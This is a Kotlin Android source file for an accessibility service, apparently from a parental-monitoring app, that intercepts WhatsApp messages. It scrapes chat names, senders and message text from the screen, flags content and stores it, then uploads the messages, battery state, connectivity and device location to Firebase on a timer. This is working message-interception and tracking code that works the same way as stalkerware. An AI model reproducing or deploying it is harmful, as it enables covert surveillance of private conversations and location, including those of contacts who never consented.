package com.device.guardian.service.service

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.SharedPreferences
import android.location.LocationManager
import android.net.ConnectivityManager
import android.os.BatteryManager
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import com.device.guardian.service.data.local.AppDatabase
import com.device.guardian.service.data.local.MessageEntity
import com.device.guardian.service.data.remote.FirebaseRepository
import com.device.guardian.service.service.extractor.MessageExtractor
import com.device.guardian.service.service.filter.MessageFilter
import kotlinx.coroutines.*
import java.util.Collections
import java.util.UUID

class GuardianAccessibilityService : AccessibilityService() {

    private lateinit var db: AppDatabase
    private lateinit var firebaseRepo: FirebaseRepository
    private lateinit var prefs: SharedPreferences

    private val extractor = MessageExtractor()
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    // Thread-safe dedup cache
    private val dedupCache = Collections.synchronizedSet(LinkedHashSet<String>())
    private val DEDUP_MAX = 150
    private val DEDUP_WINDOW_MS = 600_000L // 10 minutes

    companion object {
        private const val TAG = "GuardianService"
        private const val PREFS_NAME = "gd_prefs"
        private const val KEY_PARENT_ID = "pid"
        private const val SYNC_INTERVAL_MS = 30_000L
    }

    override fun onServiceConnected() {
        super.onServiceConnected()

        prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE)

        db = AppDatabase.getInstance(this)
        firebaseRepo = FirebaseRepository(db.messageDao(), this)

        // Configure service info programmatically as extra layer
        serviceInfo = serviceInfo.apply {
            eventTypes = AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED or
                         AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED
            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
            notificationTimeout = 100
            packageNames = arrayOf("com.whatsapp", "com.whatsapp.w4b")
        }

        startPeriodicSync()
        startCleanupWorker()
        startStatusSync()

        Log.d(TAG, "Service connected")
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        event ?: return

        val pkg = event.packageName?.toString() ?: return
        if (!pkg.startsWith("com.whatsapp")) return

        // Only process content change events
        if (event.eventType != AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED &&
            event.eventType != AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) return

        val root = rootInActiveWindow ?: return

        // FIX: Extract synchronously on the main thread (prevents AccessibilityNodeInfo recycling crashes)
        val extracted = try {
            extractor.extract(root)
        } catch (e: Exception) {
            Log.w(TAG, "Extraction error: ${e.message}")
            emptyList()
        }

        if (extracted.isEmpty()) return

        scope.launch {
            // Apply sequential millisecond offset to preserve chronological message sequence
            val now = System.currentTimeMillis()
            extracted.forEachIndexed { index, rawMessage ->
                val adjustedTimestamp = now - (extracted.size - 1 - index) * 10L
                processMessage(rawMessage, adjustedTimestamp)
            }
        }
    }

    private suspend fun processMessage(raw: MessageExtractor.RawMessage, timestamp: Long) {
        // Step 1 — in-memory dedup
        val cacheKey = "${raw.chatName}::${raw.content}::${raw.sender}"
        if (dedupCache.contains(cacheKey)) return
        if (dedupCache.size >= DEDUP_MAX) dedupCache.remove(dedupCache.iterator().next())
        dedupCache.add(cacheKey)

        // Step 2 — DB-level dedup (10 minute window)
        val since = timestamp - DEDUP_WINDOW_MS
        val dupes = db.messageDao().countDuplicates(raw.content, raw.chatName, since)
        if (dupes > 0) return

        // Step 3 — analyze
        val filter = MessageFilter.analyze(raw.content)

        // Step 4 — persist locally first
        val entity = MessageEntity(
            id = UUID.randomUUID().toString(),
            content = raw.content,
            sender = raw.sender,
            chatName = raw.chatName,
            timestamp = timestamp,
            isGroupChat = raw.isGroupChat,
            isOutgoing = raw.isOutgoing,
            isFlagged = filter.isFlagged,
            flagReason = filter.reason,
            isSynced = false
        )
        db.messageDao().insert(entity)

        // Step 5 — attempt immediate sync
        firebaseRepo.syncPending()
    }

    // Periodic sync — catches anything that failed immediate sync
    private fun startPeriodicSync() {
        scope.launch {
            while (isActive) {
                delay(SYNC_INTERVAL_MS)
                try {
                    firebaseRepo.syncPending()
                } catch (e: Exception) {
                    Log.w(TAG, "Periodic sync error: ${e.message}")
                }
            }
        }
    }

    // Run status sync periodically (every 5 minutes)
    private fun startStatusSync() {
        scope.launch {
            while (isActive) {
                try {
                    syncStatusNow()
                } catch (e: Exception) {
                    Log.w(TAG, "Status sync error: ${e.message}")
                }
                delay(300_000L) // 5 minutes
            }
        }
    }

    private suspend fun syncStatusNow() {
        // 1. Battery status
        val batteryFilter = IntentFilter(Intent.ACTION_BATTERY_CHANGED)
        val batteryStatus = registerReceiver(null, batteryFilter)
        val level = batteryStatus?.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) ?: -1
        val scale = batteryStatus?.getIntExtra(BatteryManager.EXTRA_SCALE, -1) ?: -1
        val batteryPct = if (level >= 0 && scale > 0) (level * 100 / scale) else -1
        val isCharging = batteryStatus?.getIntExtra(BatteryManager.EXTRA_STATUS, -1) == BatteryManager.BATTERY_STATUS_CHARGING

        // 2. Connectivity
        val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        val activeNetwork = cm.activeNetworkInfo
        val isOnline = activeNetwork?.isConnected == true

        // 3. Location coordinates
        var lat: Double? = null
        var lon: Double? = null
        try {
            val lm = getSystemService(Context.LOCATION_SERVICE) as LocationManager
            if (checkSelfPermission(android.Manifest.permission.ACCESS_COARSE_LOCATION) == android.content.pm.PackageManager.PERMISSION_GRANTED) {
                val gpsLoc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER)
                val netLoc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
                val bestLoc = gpsLoc ?: netLoc
                bestLoc?.let {
                    lat = it.latitude
                    lon = it.longitude
                }
            }
        } catch (e: SecurityException) {
            Log.w(TAG, "Location permission not granted yet")
        } catch (e: Exception) {
            Log.w(TAG, "Failed to get location: ${e.message}")
        }

        firebaseRepo.syncDeviceStatus(batteryPct, isCharging, isOnline, lat, lon)
    }

    // Delete messages older than 30 days to save local storage
    private fun startCleanupWorker() {
        scope.launch {
            // Run immediately on startup, then daily
            while (isActive) {
                val cutoff = System.currentTimeMillis() - (30L * 24 * 60 * 60 * 1000L)
                db.messageDao().deleteOlderThan(cutoff)
                delay(24 * 60 * 60 * 1000L) // daily
            }
        }
    }

    override fun onInterrupt() {
        Log.w(TAG, "Service interrupted")
    }

    override fun onDestroy() {
        super.onDestroy()
        scope.cancel()
    }
}
